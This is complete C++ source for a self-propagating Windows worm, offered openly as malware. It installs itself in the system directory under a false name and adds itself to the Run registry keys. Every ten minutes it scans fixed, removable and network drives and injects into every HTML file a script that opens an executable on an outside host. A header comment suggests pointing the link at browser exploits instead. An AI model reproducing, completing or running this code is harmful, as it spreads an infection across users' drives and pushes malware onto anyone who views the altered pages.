// Name: Win32.HTMLworm
// Author: WarGame
// Compiler: Borland C++
// Description: This worm spreads by adding a link to itself in html files
// Improvements:  You could add a link to a page containing an IE exploits :)

#include <windows.h>
#include <string>
using namespace std; // :)

// This function does the real work
void HTMLSpread(char *htmlfile)
{
      HANDLE html_fd;
      DWORD html_filesize,read_bytes,written_bytes;
      char *c_htmlcode = NULL;
      string *htmlcode = NULL; // make it simpler
      long pos;

      // open the html file
      html_fd = CreateFile(htmlfile,GENERIC_READ|GENERIC_WRITE,
                        FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

      if(html_fd == INVALID_HANDLE_VALUE)
      {
           return;
      }

      // get file size
      html_filesize = GetFileSize(html_fd,NULL);

      // allocate enough memory
      c_htmlcode = (char *)malloc(html_filesize);

      if(c_htmlcode == NULL)
      {
           return;
      }

      // read entire file
      if(ReadFile(html_fd,c_htmlcode,html_filesize,&read_bytes,NULL) == 0)
      {
           CloseHandle(html_fd);
           return;
      }

      // create a string object
      htmlcode = new string(c_htmlcode);
      free(c_htmlcode);

      // already infected ?
      if(htmlcode->find("<!-- HTMLworm by [WarGame,#eof] !-->") == string::npos)
      {

      pos = htmlcode->find("</body>");

           if(pos == string::npos)
           {
               pos = htmlcode->find("</BODY>");

                   if(pos == string::npos)
                   {
                        CloseHandle(html_fd);
                        delete htmlcode;
                        return;
                   }
           }

      // add link
      htmlcode->replace(pos,7,"\r\n<script language=\"javascript\">window.open('http://hexter.host.sk/artwork.exe')</script>\r\n</body>");

      // write new file
      SetFilePointer(html_fd,0,0,FILE_BEGIN);
      WriteFile(html_fd,htmlcode->c_str(),htmlcode->size(),&written_bytes,NULL);
      // infection mark
      WriteFile(html_fd,"<!-- HTMLworm by [WarGame,#eof] !-->",36,&written_bytes,NULL);

      }

      // close all
      CloseHandle(html_fd);
      delete htmlcode;

}

// add worm to startup list
void AutoStart(char *my_path)
{
	HKEY hkey;

	 if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		 "Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,
		 KEY_WRITE,&hkey)==ERROR_SUCCESS)
	 {
			RegSetValueEx(hkey,"himon",0,REG_SZ,my_path,strlen(my_path));
			RegCloseKey(hkey);
	 }

	 if(RegOpenKeyEx(HKEY_CURRENT_USER,
		 "Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,
		 KEY_WRITE,&hkey)==ERROR_SUCCESS)
	 {
			RegSetValueEx(hkey,"himon",0,REG_SZ,my_path,strlen(my_path));
			RegCloseKey(hkey);
	 }
}

// This will scan drives for html files
void S3arch(char *pt) {
	 char sc[MAX_PATH],buf[MAX_PATH];
	 WIN32_FIND_DATA in;
	 HANDLE fd,file;
	 char *fm = "%s\\%s",*fm1 = "%s\\*.*";

	 if(strlen(pt) == 3)
	 {
		pt[2] = '\0'; /* :-) */
	 }

	 sprintf(sc,fm1,pt);
     fd = FindFirstFile(sc,&in);

 do
 {

	 sprintf(buf,fm,pt,in.cFileName);

	   /* dot :) */
	 if(strcmp(in.cFileName,"..") != 0 && strcmp(in.cFileName,".") != 0 && (in.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
	 {
		 S3arch(buf);
	 }

	   /* File found */
	 else
	 {

		 /* is it good to infect ? */

		 if(strstr(in.cFileName,".html") || strstr(in.cFileName,".htm"))
		 {
			 HTMLSpread(buf);
		 }
	 }

 }while(FindNextFile(fd,&in));

 FindClose(fd);
}


// entry point of worm
int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
       // usual shit: installation part, startup and so on ...
       char I_am_here[MAX_PATH],installation_path[MAX_PATH];
       char Drives[3],Drive = 0;
       UINT drive_type;


       // only one copy
       CreateMutex(NULL,FALSE,"__HTMLworm_by_WarGame_EOF__");
       if(GetLastError() == ERROR_ALREADY_EXISTS)
       {
          ExitProcess(0);
       }

       GetSystemDirectory(installation_path,MAX_PATH);
       strcat(installation_path,"\\himon.exe");

       GetModuleFileName(NULL,I_am_here,MAX_PATH);
       // Copy!
       CopyFile(I_am_here,installation_path,FALSE);
       AutoStart(installation_path);


       // the real part starts here
       while(1)
       {

		  /* Search for drives */
		for(Drive = 'C';Drive <= 'Z';Drive++)
		{
		Drives[0] = Drive;
		Drives[1] = ':';
		Drives[2] = '\\';
		Drives[3] = '\0';

		/* drive ? */
		drive_type = GetDriveType(Drives);

		          /* only fixed, remote and removable drives */
		       if(drive_type == DRIVE_FIXED ||
                               drive_type == DRIVE_REMOTE ||
                                    drive_type == DRIVE_REMOVABLE)
			   {
				     /* GO! */
				   S3arch(Drives);
			   }
		}

		/* every 10 minutes */
		Sleep((1000*60)*10);
       }
}
